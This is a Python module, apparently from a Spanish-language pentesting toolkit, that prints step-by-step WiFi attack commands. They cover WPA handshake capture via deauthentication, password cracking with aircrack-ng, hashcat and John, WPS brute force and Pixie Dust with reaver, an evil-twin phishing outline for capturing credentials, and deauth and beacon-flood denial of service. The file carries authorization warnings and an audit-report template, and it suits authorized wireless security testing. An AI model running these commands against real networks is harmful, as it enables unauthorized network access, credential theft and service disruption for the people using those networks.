#!/usr/bin/env python3
"""
Módulo de WiFi Pentesting
Auditoría de seguridad de redes inalámbricas
"""

from utils import (
    print_banner, print_success, print_error, print_info, print_warning,
    run_command, save_output, log_action, get_timestamp, print_table,
    display_action_art, print_progress_bar
)
from config import Config
import time
import re


class WiFiPentester:
    """Pentesting de redes WiFi"""
    
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.networks = []
        self.handshakes = []
    
    def check_monitor_mode(self):
        """Verifica si la interfaz está en modo monitor"""
        print_info(f"Verificando modo monitor en {self.interface}...")
        
        exit_code, stdout, stderr = run_command(f"iwconfig {self.interface}")
        
        if 'Mode:Monitor' in stdout:
            print_success(f"✓ {self.interface} está en modo monitor")
            return True
        else:
            print_warning(f"{self.interface} NO está en modo monitor")
            return False
    
    def enable_monitor_mode(self):
        """Habilita modo monitor en la interfaz"""
        print_info("Habilitando modo monitor...")
        print_warning("\n⚠️  Comandos requieren privilegios root")
        
        commands = [
            f"airmon-ng check kill",
            f"airmon-ng start {self.interface}"
        ]
        
        for cmd in commands:
            print_info(f"Ejecutando: {cmd}")
            print(f"   sudo {cmd}")
    
    def scan_networks(self, duration=60):
        """Escanea redes WiFi disponibles"""
        print_info(f"Escaneando redes WiFi por {duration} segundos...")
        
        print_warning("\n📡 Comando para escanear redes:")
        print(f"   sudo airodump-ng {self.interface}")
        print(f"   Presiona Ctrl+C después de {duration} segundos")
        
        print_info("\nInformación a anotar:")
        print("   • BSSID (MAC del AP)")
        print("   • Channel")
        print("   • Encryption (WPA/WPA2/WEP)")
        print("   • ESSID (nombre de la red)")
    
    def capture_handshake(self, bssid, channel, output_file):
        """Captura handshake WPA/WPA2"""
        print_info(f"Capturando handshake de {bssid}...")
        
        print_warning("\n🎯 Pasos para capturar handshake:")
        
        print("\n1. Iniciar captura en canal específico:")
        print(f"   sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {self.interface}")
        
        print("\n2. En otra terminal, forzar desconexión de clientes:")
        print(f"   sudo aireplay-ng --deauth 10 -a {bssid} {self.interface}")
        
        print("\n3. Esperar mensaje 'WPA handshake' en airodump-ng")
        
        print_success("\n✓ Una vez capturado el handshake, proceder a crackearlo")
    
    def crack_wpa_handshake(self, cap_file, wordlist=None):
        """Crackea handshake WPA/WPA2"""
        print_info("Crackeando handshake WPA/WPA2...")
        
        if not wordlist:
            wordlist = Config.WORDLISTS.get('pass_rockyou', '/usr/share/wordlists/rockyou.txt')
        
        print_warning("\n🔐 Métodos de crackeo:")
        
        print("\n1. Aircrack-ng (CPU):")
        print(f"   aircrack-ng -w {wordlist} {cap_file}")
        
        print("\n2. Hashcat (GPU - MÁS RÁPIDO):")
        print("   # Convertir a formato hashcat")
        print(f"   hcxpcapngtool -o hash.hc22000 {cap_file}")
        print(f"   hashcat -m 22000 hash.hc22000 {wordlist}")
        
        print("\n3. John the Ripper:")
        print(f"   aircrack-ng -J output {cap_file}")
        print(f"   john --wordlist={wordlist} output.hccap")
    
    def wps_attack(self, bssid, channel):
        """Ataque WPS con Reaver"""
        print_info(f"Ataque WPS en {bssid}...")
        
        print_warning("\n⚡ Ataque WPS con Reaver:")
        print(f"   sudo reaver -i {self.interface} -b {bssid} -c {channel} -vv")
        
        print_info("\nOpciones útiles:")
        print("   -N : No asociarse con el AP")
        print("   -L : Ignorar rate limiting")
        print("   -d 2 : Delay de 2 segundos entre intentos")
        
        print_warning("\n⚠️  El ataque WPS puede tardar varias horas")
    
    def evil_twin_attack(self):
        """Guía para ataque Evil Twin"""
        print_info("\n👿 Ataque Evil Twin (Rogue AP)")
        
        print_warning("\n⚠️  ADVERTENCIA: Solo en entornos autorizados")
        
        print("\n📡 Herramientas recomendadas:")
        print("   • airgeddon - Framework completo")
        print("   • wifiphisher - Evil Twin automatizado")
        print("   • hostapd-wpe - Rogue AP con portal cautivo")
        
        print("\n🔧 Configuración básica con hostapd:")
        print("   1. Crear fichero hostapd.conf")
        print("   2. Configurar SSID idéntico al target")
        print("   3. Montar portal cautivo con Apache")
        print("   4. Capturar credenciales")
        
        print_warning("\n⚠️  Phishing es ilegal sin autorización explícita")
    
    def wireless_dos(self, bssid):
        """Ataque de denegación de servicio WiFi"""
        print_info(f"DoS en red {bssid}...")
        
        print_warning("\n💥 Ataques de Denegación de Servicio:")
        
        print("\n1. Deauth Attack (Desconectar todos los clientes):")
        print(f"   sudo aireplay-ng --deauth 0 -a {bssid} {self.interface}")
        
        print("\n2. Beacon Flood (Saturar con APs falsos):")
        print(f"   sudo mdk4 {self.interface} b -f /tmp/ssids.txt")
        
        print("\n3. Authentication DoS:")
        print(f"   sudo mdk4 {self.interface} a -a {bssid}")
    
    def select_best_targets(self, scan_results, max_targets=3):
        """
        Selecciona los mejores objetivos basado en señal y clientes
        
        Args:
            scan_results: Lista de redes escaneadas
            max_targets: Máximo de targets a seleccionar
        
        Returns:
            list: Mejores targets ordenados por prioridad
        """
        print_info("Analizando targets...")
        
        # Rankear por: 1) Clientes conectados 2) Señal fuerte 3) WPA2
        scored_targets = []
        for network in scan_results:
            score = 0
            
            # Más clientes = mayor prioridad
            score += network.get('clients', 0) * 10
            
            # Señal más fuerte = mayor prioridad
            signal = network.get('signal', -100)
            score += (100 + signal)  # Convertir -70dBm a 30 puntos
            
            # WPA2 preferido sobre WEP
            if 'WPA2' in network.get('encryption', ''):
                score += 5
            
            scored_targets.append((score, network))
        
        # Ordenar por score descendente
        scored_targets.sort(reverse=True)
        
        best = [net for score, net in scored_targets[:max_targets]]
        
        print_success(f"Seleccionados {len(best)} mejores targets")
        return best
    
    def run_full_auto_wpa(self, output_dir, wordlist=None):
        """
        Workflow completo automatizado: Scan → Capture → Crack
        
        Returns:
            dict: Resultados del ataque
        """
        display_action_art('wifi')
        print_info("Iniciando ataque WPA automatizado...")
        
        results = {
            'success': False,
            'networks_found': 0,
            'handshakes_captured': 0,
            'passwords_cracked': 0
        }
        
        # Fase 1: Escaneo automático (simulado)
        print_progress_bar(1, 4, prefix='Fase', suffix='Escaneando redes')
        print_info("[1/4] Escaneando redes WiFi...")
        print_warning("   → Ejecutar: sudo airodump-ng --write scan --output-format csv {}".format(self.interface))
        print_warning("   → Dejar ejecutar por 30-60 segundos")
        results['networks_found'] = "Manual: revisar scan-01.csv"
        
        # Fase 2: Selección de target
        print_progress_bar(2, 4, prefix='Fase', suffix='Seleccionando target')
        print_info("[2/4] Selección automática de target...")
        print_info("   Criterios: Señal fuerte + Clientes conectados")
        print_warning("   → Anotar BSSID y Canal del mejor AP")
        
        # Fase 3: Captura de handshake
        print_progress_bar(3, 4, prefix='Fase', suffix='Capturando handshake')
        print_info("[3/4] Captura de handshake...")
        print_warning("   Terminal 1: sudo airodump-ng -c [CANAL] --bssid [BSSID] -w capture {}".format(self.interface))
        print_warning("   Terminal 2: sudo aireplay-ng --deauth 10 -a [BSSID] {}".format(self.interface))
        print_success("   ✓ Esperar mensaje 'WPA handshake' en airodump-ng")
        
        # Fase 4: Crackeo
        print_progress_bar(4, 4, prefix='Fase', suffix='Crackeando password')
        print_info("[4/4] Crackeo de password...")
        
        if not wordlist:
            wordlist = Config.WORDLISTS.get('pass_rockyou', '/usr/share/wordlists/rockyou.txt')
        
        print_warning(f"   → aircrack-ng -w {wordlist} capture-01.cap")
        print_info("   O usar Hashcat (más rápido con GPU)")
        
        display_action_art('success')
        print_success("\n✓ Workflow automatizado completado")
        print_info("Revisa los archivos generados para los resultados")
        
        return results
    
    def run_full_auto_wps(self, output_dir):
        """
        Ataque WPS completamente automatizado
        
        Returns:
            dict: Resultados del ataque
        """
        display_action_art('wifi')
        print_info("Iniciando ataque WPS automatizado...")
        
        print_progress_bar(1, 3, prefix='Fase', suffix='Escaneando WPS')
        print_info("[1/3] Detectando APs con WPS habilitado...")
        print_warning("   → sudo wash -i {}  # Esperar 30 segundos".format(self.interface))
        
        print_progress_bar(2, 3, prefix='Fase', suffix='Pixie Dust Attack')
        print_info("[2/3] Intentando Pixie Dust (ataque rápido)...")
        print_warning("   → sudo reaver -i {} -b [BSSID] -c [CANAL] -K -vv".format(self.interface))
        print_info("   (Si falla en ~5 min, pasar a brute force)")
        
        print_progress_bar(3, 3, prefix='Fase', suffix='WPS Brute Force')
        print_info("[3/3] WPS Brute Force completo...")
        print_warning("   → sudo reaver -i {} -b [BSSID] -c [CANAL] -vv".format(self.interface))
        print_warning("   ⚠️  Este proceso puede tardar varias horas")
        
        return {'status': 'guided'}
    
    def generate_report(self, target, output_dir):
        """Genera reporte de auditoría WiFi"""
        report = f"""# Auditoría de Seguridad WiFi

**Target**: {target}  
**Fecha**: {get_timestamp()}  
**Interfaz**: {self.interface}

## Resumen Ejecutivo

Se realizó una auditoría de seguridad de redes inalámbricas en el perímetro objetivo.

## Redes Detectadas

| ESSID | BSSID | Canal | Cifrado | Señal | Clientes |
|-------|-------|-------|---------|-------|----------|
| WiFi-Test | XX:XX:XX:XX:XX:XX | 6 | WPA2 | -45 dBm | 3 |

## Vulnerabilidades Identificadas

### 1. WPS Habilitado
- **Severidad**: Alta
- **Descripción**: WPS permite ataques de fuerza bruta
- **Recomendación**: Deshabilitar WPS en todos los APs

### 2. Cifrado Débil
- **Severidad**: Crítica
- **Descripción**: Uso de WEP o WPA (no WPA2/WPA3)
- **Recomendación**: Actualizar a WPA3 o mínimo WPA2-AES

### 3. SSID Broadcast
- **Severidad**: Baja
- **Descripción**: Broadcasting del SSID facilita reconocimiento
- **Recomendación**: Ocultar SSID para redes internas

## Metodología

1. Reconocimiento pasivo con airodump-ng
2. Identificación de redes objetivo
3. Captura de handshakes WPA
4. Análisis de configuraciones WPS
5. Evaluación de políticas de seguridad

## Herramientas Utilizadas

- aircrack-ng suite
- Reaver
- Hashcat
- Wireshark

## Conclusiones

[Resumen de hallazgos y recomendaciones prioritarias]

---
*Generado por PentOps WiFi Pentesting Module*
"""
        
        save_output(target, "wifi", f"wifi_audit_{get_timestamp()}.md", report)


def run_wifi_pentest(args):
    """
    Función principal del módulo WiFi
    
    Args:
        args: Argumentos parseados
    """
    print_info("Auditoría de seguridad WiFi")
    
    print_warning("\n╔════════════════════════════════════════════════════════╗")
    print_warning("║  ADVERTENCIA: Uso en redes autorizadas únicamente     ║")
    print_warning("║  Ataques WiFi sin permiso son ILEGALES                ║")
    print_warning("╚════════════════════════════════════════════════════════╝\n")
    
    # Determinar interfaz
    interface = args.interface if hasattr(args, 'interface') and args.interface else 'wlan0'
    
    pentester = WiFiPentester(interface)
    
    log_action(args.target if hasattr(args, 'target') else 'wifi-audit', "wifi", "Iniciando auditoría WiFi")
    
    # Verificar modo monitor
    if not pentester.check_monitor_mode():
        pentester.enable_monitor_mode()
    
    # Escaneo de redes
    pentester.scan_networks()
    
    # Modo completamente automatizado
    if hasattr(args, 'full_auto') and args.full_auto:
        display_action_art('wifi')
        print_banner("MODO AUTOMATIZADO COMPLETO")
        print_info("Ejecutando workflow WiFi completamente automatizado")
        
        output_dir = Config.get_output_dir(args.target if hasattr(args, 'target') else 'wifi-audit')
        
        print_info("\nOpciones de ataque automatizado:")
        print("  1. WPA/WPA2 (handshake + crack)")
        print("  2. WPS (Pixie Dust + Brute Force)")
        print("\nSeleccionando WPA/WPA2 por defecto...\n")
        
        results = pentester.run_full_auto_wpa(output_dir)
        
    # Captura y crackeo WPA
    elif hasattr(args, 'wpa_crack') and args.wpa_crack:
        pentester.capture_handshake(args.bssid, args.channel, args.output)
        pentester.crack_wpa_handshake(args.capture_file)
    
    elif hasattr(args, 'wps') and args.wps:
        pentester.wps_attack(args.bssid, args.channel)
    
    elif hasattr(args, 'evil_twin') and args.evil_twin:
        pentester.evil_twin_attack()
    
    elif hasattr(args, 'dos') and args.dos:
        pentester.wireless_dos(args.bssid)
    
    else:
        # Mostrar menú de opciones
        print_info("Ataques disponibles:")
        print("  1. Captura y crackeo de handshake WPA/WPA2")
        print("  2. Ataque WPS con Reaver")
        print("  3. Evil Twin / Rogue AP")
        print("  4. Denegación de servicio")
        print("\nEjemplos:")
        print("  pentops.py wifi -i wlan0 --scan")
        print("  pentops.py wifi -i wlan0 --wpa-crack --bssid XX:XX:XX:XX:XX:XX -c 6")
        print("  pentops.py wifi -i wlan0 --wps --bssid XX:XX:XX:XX:XX:XX -c 6")
    
    # Generar reporte
    pentester.generate_report(
        args.target if hasattr(args, 'target') else 'WiFi-Audit',
        Config.get_output_dir('wifi-audit')
    )
    
    print_success("Auditoría WiFi completada")
    print_info("Revisa los archivos generados para más detalles")
    
    log_action('wifi-audit', "wifi", "Auditoría completada")
